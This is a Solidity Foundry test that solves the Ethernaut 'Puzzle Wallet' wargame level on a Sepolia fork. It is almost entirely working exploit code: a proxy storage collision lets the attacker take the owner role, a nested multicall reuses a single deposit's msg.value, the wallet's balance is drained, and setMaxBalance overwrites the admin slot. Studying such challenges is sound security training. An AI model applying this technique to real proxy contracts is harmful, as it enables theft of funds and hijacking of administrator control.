// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {PuzzleProxy, PuzzleWallet} from "../../src/ethernaut/PuzzleProxy.sol";

contract PuzzleProxyAttackerTest is Test {
    address alice = 0x6278A1E803A76796a3A1f7F6344fE874ebfe94B2;

    PuzzleProxy puzzleProxy =
        PuzzleProxy(payable(0xD759B1762559E4042C722e11033Cf193e48ce923));

    PuzzleWallet puzzleWalletImp =
        PuzzleWallet(0xfCA940B93F93BB99d01D255a6988c3d97cd79128);

    function setUp() public {
        uint256 forkId = vm.createFork(
            vm.envString("SEPOLIA_RPC_URL"),
            6347823
        );
        vm.selectFork(forkId);
    }

    function testInfo() public view {
        console.log("puzzleProxy.pendingAdmin()", puzzleProxy.pendingAdmin());
        console.log("puzzleProxy.admin()", puzzleProxy.admin());
    }

    function testAttacker() public {
        _attack();
        assertEq(puzzleProxy.admin(), alice);
    }

    function _attack() internal {
        vm.startPrank(alice);

        // addToWhitelist
        puzzleProxy.proposeNewAdmin(alice);

        console.log(
            "PuzzleWallet(address(puzzleProxy)).owner:",
            PuzzleWallet(address(puzzleProxy)).owner()
        );
        PuzzleWallet(address(puzzleProxy)).addToWhitelist(alice);

        console.log(
            "PuzzleWallet(address(puzzleProxy)).whitelisted[alice]:",
            PuzzleWallet(address(puzzleProxy)).whitelisted(alice)
        );

        // address(this).balance == 0
        bytes[] memory data = new bytes[](2);
        data[0] = abi.encodeCall(PuzzleWallet.deposit, ());
        bytes[] memory data2 = new bytes[](1);
        data2[0] = abi.encodeCall(PuzzleWallet.deposit, ());
        data[1] = abi.encodeCall(PuzzleWallet.multicall, (data2));

        console.log(
            "multicall before balances[alice]:",
            PuzzleWallet(address(puzzleProxy)).balances(alice)
        );
        PuzzleWallet(address(puzzleProxy)).multicall{
            value: address(puzzleProxy).balance
        }(data);

        console.log(
            "multicall after balances[alice]:",
            PuzzleWallet(address(puzzleProxy)).balances(alice)
        );

        PuzzleWallet(address(puzzleProxy)).execute(
            alice,
            PuzzleWallet(address(puzzleProxy)).balances(alice),
            "0x"
        );

        uint256 _maxBalance = uint256(uint160(alice));
        PuzzleWallet(address(puzzleProxy)).setMaxBalance(_maxBalance);

        vm.stopPrank();
    }
}

// forge test --match-contract PuzzleProxyAttackerTest -vvv
